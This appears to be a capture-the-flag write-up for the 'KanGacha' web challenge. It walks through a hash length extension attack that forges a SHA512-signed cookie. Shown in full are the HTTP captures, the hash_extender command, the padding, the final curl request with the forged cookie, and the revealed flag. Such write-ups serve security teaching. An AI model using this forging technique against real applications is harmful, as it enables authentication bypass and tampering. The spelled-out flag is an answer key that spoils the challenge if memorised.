'''
Task: Acquire Yamato
http://ctfq.sweetduet.info:10080/~q31/kangacha.php
'''

Source code for kangacha.php is available at "source" link.

kangacha.php is a program which randomly pick up ship name from an array and prints it out within response.

When you hit Gacha button, HTTP POST will be sent to kangacha.php along with the parameter and value "submit=Gacha".
kangacha.php will then randomly pick up ship number from an array. The array consists of 11 ship names (0-10 elements) and Yamato is stored at 10th element; however, kangacha.php will only select ship names from 0 to 9 elements so you will never get Yamato. Once ship name is selected, kangacha.php will embed ship number to Cookie header named "ship" and calculate SHA512 hash for SALT + ship number and embed to Cookie header named "signature". kangacha.php will then redirect the client to same resource kangacha.php using HTTP 302 redirect. Due to this redirection, client will send HTTP GET to kangacha.php along with Cookie named "ship" and "signature".

kangacha.php checks if SHA512 hash for SALT + $_COOKIE['ship'] matches with SHA512 hash value stored in $_COOKIE['signature']. If it matches, kangacha.php will prints out ship names that corresponds to ship number stored in $_COOKIE['ship'].

Below is example of HTTP requests and responses:

'''
POST /~q31/kangacha.php HTTP/1.1
Host: ctfq.sweetduet.info:10080
Connection: keep-alive
Content-Length: 12
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://ctfq.sweetduet.info:10080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://ctfq.sweetduet.info:10080/~q31/kangacha.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8

submit=Gacha

HTTP/1.1 302 Found
Date: Sat, 20 Jun 2020 13:21:48 GMT
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/5.3.3
Set-Cookie: ship=6
Set-Cookie: signature=47eb83d06da9debde8b2b1ad649e312372f944e55bc27cb8160d4488489df7ec92f987bb08267b9b95e0d3e94a852a9325f3fde1d17c213eba4151e5c94164fb
Location: /~q31/kangacha.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
'''

'''
GET /~q31/kangacha.php HTTP/1.1
Host: ctfq.sweetduet.info:10080
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://ctfq.sweetduet.info:10080/~q31/kangacha.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8
Cookie: ship=6; signature=47eb83d06da9debde8b2b1ad649e312372f944e55bc27cb8160d4488489df7ec92f987bb08267b9b95e0d3e94a852a9325f3fde1d17c213eba4151e5c94164fb

HTTP/1.1 200 OK
Date: Sat, 20 Jun 2020 13:21:48 GMT
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/5.3.3
Content-Length: 301
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
  <head>
    <title>KanGacha</title>
  </head>
  <body>
    <h1>KanGacha</h1>
    <form method="POST">
      <input type="submit" name="submit" value="Gacha">
      <input type="submit" name="submit" value="Clear">
    </form>
    <ul>
<li>Fuso</li>
    </ol>
  </body>
</html>
'''

The program kangacha.php is vulnerable to hash length extension attack. 

What is hash length extension attack? 

An application is susceptible to a hash length extension attack if it prepends a secret value to a string, hashes it with a vulnerable algorithm (such as Merkle–Damgård), and entrusts the attacker with both the string and the hash, but not the secret. Then, the server relies on the secret to decide whether or not the data returned later is the same as the original data. (Ref: https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks)

kangacha.php prepends secret salt to a string stored in Cookie header and hashes it with SHA512 so it is vulnerable to above described hash length extension attack.

I used a tool called hash_extender (https://github.com/iagox86/hash_extender) in order to create exploit payload.

'''
./hash_extender --data [original data] --secret [length of secret salt] --append [data you want to append] --signature [known valid signature] --format [hash algorithm]
'''

Based on source code for kangacha.php, I know that length of secret salt is 21 bytes and based on above HTTP requests, I know that signature for ship number 6 is 47eb83d06da9debde8b2b1ad649e312372f944e55bc27cb8160d4488489df7ec92f987bb08267b9b95e0d3e94a852a9325f3fde1d17c213eba4151e5c94164fb (ship=6; signature=47eb83d06da9debde8b2b1ad649e312372f944e55bc27cb8160d4488489df7ec92f987bb08267b9b95e0d3e94a852a9325f3fde1d17c213eba4151e5c94164fb).

I need to create a valid signature for ship number "10" Yamato so the full command line arguments will be as follows:

'''
./hash_extender --data "6" --secret 21 --append ",10" --signature 47eb83d06da9debde8b2b1ad649e312372f944e55bc27cb8160d4488489df7ec92f987bb08267b9b95e0d3e94a852a9325f3fde1d17c213eba4151e5c94164fb --format sha512
'''

Below is the command result:

'''
$  ./hash_extender --data "6" --secret 21 --append ",10" --signature 47eb83d06da9debde8b2b1ad649e312372f944e55bc27cb8160d4488489df7ec92f987bb08267b9b95e0d3e94a852a9325f3fde1d17c213eba4151e5c94164fb --format sha512
Type: sha512
Secret length: 21
New signature: 7c41077bd652cb187f7fe2fa16c6c1837c49e222df7b917086dd1ccbd7ddb1e91fbd3c984b1a0b7fc914b94a3ac83b5cd8aa1272c8d548bf04c3f04cf30f81fa
New string: 36800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b02c3130
'''

Now all I have to do is append the padding string "36800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b02c3130" to Cookie header "ship=6" and send it with signature "7c41077bd652cb187f7fe2fa16c6c1837c49e222df7b917086dd1ccbd7ddb1e91fbd3c984b1a0b7fc914b94a3ac83b5cd8aa1272c8d548bf04c3f04cf30f81fa"

The padding string will hex decodes as follows:

'''
>>> '36800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b02c3130'.decode('hex')
'6\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb0,10'
'''

I need to replace "\x" with "%" (percent encoding) so kangacha.php can handle the request.

I was able to get flag with the following curl command:

'''
curl -i http://ctfq.sweetduet.info:10080/~q31/kangacha.php -H "Cookie: ship=6%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b0,10; signature=7c41077bd652cb187f7fe2fa16c6c1837c49e222df7b917086dd1ccbd7ddb1e91fbd3c984b1a0b7fc914b94a3ac83b5cd8aa1272c8d548bf04c3f04cf30f81fa"
'''

'''
$ curl -i http://ctfq.sweetduet.info:10080/~q31/kangacha.php -H "Cookie: ship=6%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b0,10; signature=7c41077bd652cb187f7fe2fa16c6c1837c49e222df7b917086dd1ccbd7ddb1e91fbd3c984b1a0b7fc914b94a3ac83b5cd8aa1272c8d548bf04c3f04cf30f81fa"
HTTP/1.1 200 OK
Date: Sun, 28 Jun 2020 09:42:18 GMT
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/5.3.3
Content-Length: 407
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
  <head>
    <title>KanGacha</title>
  </head>
  <body>
    <h1>KanGacha</h1>
    <form method="POST">
      <input type="submit" name="submit" value="Gacha">
      <input type="submit" name="submit" value="Clear">
    </form>
    <ul>
<li></li>
<li>Yamato [Congratulations! The flag is FLAG_uc8qVFa8Sr6DwYVP. This is called Length extension attack.]</li>
    </ol>
  </body>
</html>
'''

FLAG_uc8qVFa8Sr6DwYVP

Ref:
https://www.whitehatsec.com/blog/hash-length-extension-attacks/
https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks
https://en.wikipedia.org/wiki/Length_extension_attack
https://isc.sans.edu/forums/diary/Modern+Web+Application+Penetration+Testing+Hash+Length+Extension+Attacks/22792/
https://github.com/iagox86/hash_extender
https://www.slideshare.net/exploresecurity/hash-length-extension-attacks
https://ctftime.org/writeup/9475